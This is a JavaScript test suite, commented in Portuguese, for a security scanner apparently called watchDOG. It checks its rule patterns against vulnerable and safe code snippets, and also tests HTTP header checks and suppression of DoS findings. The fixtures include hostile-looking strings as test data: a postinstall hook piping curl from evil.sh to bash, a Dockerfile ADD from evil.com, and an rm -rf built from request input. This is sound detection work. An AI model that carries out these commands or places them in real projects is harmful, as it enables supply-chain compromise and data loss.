'use strict';
// Suíte de testes do watchDOG — runner nativo do Node (node:test), sem dependências externas.
// Roda contra o build em dist/. Execute via: npm run test --workspace=scanner
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');

const { allFileRules, allHttpRules } = require('../dist/rules/index.js');
const { analyzeLocalProject } = require('../dist/index.js');

function ruleById(id) {
  const r = allFileRules.find(x => x.id === id);
  assert.ok(r, `regra ${id} não encontrada em allFileRules`);
  return r;
}
function httpRuleById(id) {
  const r = allHttpRules.find(x => x.id === id);
  assert.ok(r, `HttpRule ${id} não encontrada`);
  return r;
}
// Testa um snippet contra os patterns de uma regra usando clones sem estado (evita lastIndex global).
function matchesRule(id, snippet) {
  const r = ruleById(id);
  return r.patterns.some(p => new RegExp(p.source, p.flags.replace('g', '')).test(snippet));
}

// ---------------------------------------------------------------------------
test('integridade: sem IDs duplicados em allFileRules', () => {
  const ids = allFileRules.map(r => r.id);
  const dup = [...new Set(ids.filter((id, i) => ids.indexOf(id) !== i))];
  assert.deepEqual(dup, [], `IDs duplicados: ${dup.join(', ')}`);
});

test('integridade: todos os campos obrigatórios e patterns válidos', () => {
  const sev = new Set(['critical', 'high', 'medium', 'low', 'info']);
  for (const r of allFileRules) {
    assert.ok(r.id && r.title && r.category, `campos base faltando em ${r.id}`);
    assert.ok(sev.has(r.severity), `severity inválida em ${r.id}: ${r.severity}`);
    assert.ok(r.description && r.impact && r.remediation, `texto faltando em ${r.id}`);
    assert.ok(Array.isArray(r.patterns), `patterns não é array em ${r.id}`);
    for (const p of r.patterns) assert.ok(p instanceof RegExp, `pattern não-RegExp em ${r.id}`);
    if (r.fileExtensions) for (const e of r.fileExtensions) assert.ok(e.startsWith('.'), `ext sem ponto em ${r.id}: ${e}`);
  }
});

test('integridade: HttpRules têm check() função', () => {
  for (const r of allHttpRules) assert.equal(typeof r.check, 'function', `check inválido em ${r.id}`);
  assert.ok(allFileRules.length >= 200, `esperava >=200 FileRules, tem ${allFileRules.length}`);
  assert.ok(allHttpRules.length >= 20, `esperava >=20 HttpRules, tem ${allHttpRules.length}`);
});

// ---------------------------------------------------------------------------
// Casamento POSITIVO (código vulnerável deve disparar)
const positivos = [
  ['INJ_001', 'exec(`rm -rf ${req.body.path}`)'],
  ['INJ_002', 'subprocess.run(cmd, shell=True)'],
  ['INJ_006', 'User.find(req.body)'],
  ['INJ_009', "const s = require('node-serialize'); s.unserialize(data)"],
  ['INJ_015', 'setTimeout(`doWork(${req.query.n})`, 100)'],
  ['RED_001', 'res.redirect(req.query.next)'],
  ['SSRF_001', 'axios.get(req.body.url)'],
  ['JWT_002', "jwt.verify(t, k, { algorithms: ['none'] })"],
  ['JWT_003', 'const p = jwt.decode(token)'],
  ['JWT_006', 'jwt.verify(t, k, { ignoreExpiration: true })'],
  ['SECRET_013', 'const k = "AKIAIOSFODNN7EXAMPLE"'],
  ['SECRET_020', '-----BEGIN RSA PRIVATE KEY-----'],
  ['DOS_014', 'const re = new RegExp(req.query.term)'],
  ['DOS_007', 'repo.find({ take: req.query.limit })'],
  ['MASS_001', 'await User.create({ data: req.body })'],
  ['LLM_004', 'new OpenAI({ dangerouslyAllowBrowser: true })'],
  ['K8S_001', 'securityContext:\n  privileged: true'],
  ['K8S_002', 'spec:\n  hostNetwork: true'],
  ['DOCKER_010', 'USER root'],
  ['DOCKER_012', 'ADD https://evil.com/x.sh /tmp/x.sh'],
  ['IAC_001', 'acl = "public-read"'],
  ['SUPPLY_001', '"postinstall": "curl https://evil.sh | bash"'],
  ['CICD_011', 'run: echo ${{ github.event.issue.title }}'],
  ['WEB3_013', 'selfdestruct(payable(owner));'],
];
for (const [id, snippet] of positivos) {
  test(`positivo: ${id} dispara em código vulnerável`, () => {
    assert.ok(matchesRule(id, snippet), `${id} NÃO casou: ${snippet}`);
  });
}

// Casamento NEGATIVO (código seguro NÃO deve disparar)
const negativos = [
  ['INJ_001', "execFile('git', ['clone', repoUrl])"],
  ['SSRF_001', 'axios.get("https://api.fixo.com/health")'],
  ['JWT_003', 'jwt.verify(token, secret, { algorithms: ["HS256"] })'],
  ['DOS_014', 'const re = /^[a-z]+$/'],
  ['RED_001', 'res.redirect("/dashboard")'],
  ['DOCKER_010', 'USER node'],
  ['IAC_001', 'acl = "private"'],
];
for (const [id, snippet] of negativos) {
  test(`negativo: ${id} NÃO dispara em código seguro`, () => {
    assert.ok(!matchesRule(id, snippet), `${id} casou indevidamente (falso-positivo): ${snippet}`);
  });
}

// ---------------------------------------------------------------------------
// HttpRules: cookies, CSP, WAF/CDN
test('HttpRule COOKIE_001: dispara em Set-Cookie sem HttpOnly', () => {
  const r = httpRuleById('COOKIE_001');
  assert.equal(r.check({ 'set-cookie': 'session=abc; Path=/; Secure' }), true);
  assert.equal(r.check({ 'set-cookie': 'session=abc; HttpOnly; Secure' }), false);
});
test('HttpRule DOSH_002: detecta WAF/CDN via cf-ray (Cloudflare)', () => {
  const r = httpRuleById('DOSH_002');
  assert.equal(r.check({ 'cf-ray': '8a1b2c3d4e5f-GRU' }), true);
  assert.equal(r.check({ server: 'nginx' }), false);
});

// ---------------------------------------------------------------------------
// Supressão cross-file (gate de postura DoS) — ponta a ponta no analyzer
function mkProject(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wd-test-'));
  for (const [name, content] of Object.entries(files)) {
    fs.writeFileSync(path.join(dir, name), content, 'utf8');
  }
  return dir;
}
async function scanIds(dir) {
  const res = await analyzeLocalProject({ projectPath: dir, scanId: 't', onEvent: () => {} });
  return new Set(res.findings.map(f => f.ruleId));
}

test('cross-file: DOS_001 dispara em Express SEM rate limiting', async () => {
  const dir = mkProject({ 'server.js': "const express=require('express');\nconst app=express();\napp.listen(3000);" });
  const ids = await scanIds(dir);
  assert.ok(ids.has('DOS_001'), 'DOS_001 deveria disparar sem rate limit');
});

test('cross-file: DOS_001 é suprimida quando há rate limiting no projeto', async () => {
  const dir = mkProject({
    'server.js': "const express=require('express');\nconst app=express();\napp.listen(3000);",
    'mw.js': "const rateLimit=require('express-rate-limit');\nmodule.exports=rateLimit({windowMs:60000,max:100});",
  });
  const ids = await scanIds(dir);
  assert.ok(!ids.has('DOS_001'), 'DOS_001 deveria ser suprimida (rate limiter presente)');
});

test('cross-file: DOS_004 suprimida quando há timeouts de servidor', async () => {
  const semTimeout = await scanIds(mkProject({ 'a.js': 'const s=http.createServer(app);\ns.listen(80);' }));
  assert.ok(semTimeout.has('DOS_004'), 'DOS_004 deveria disparar sem timeouts');
  const comTimeout = await scanIds(mkProject({ 'a.js': 'const s=http.createServer(app);\ns.requestTimeout=30000;\ns.listen(80);' }));
  assert.ok(!comTimeout.has('DOS_004'), 'DOS_004 deveria ser suprimida com requestTimeout');
});
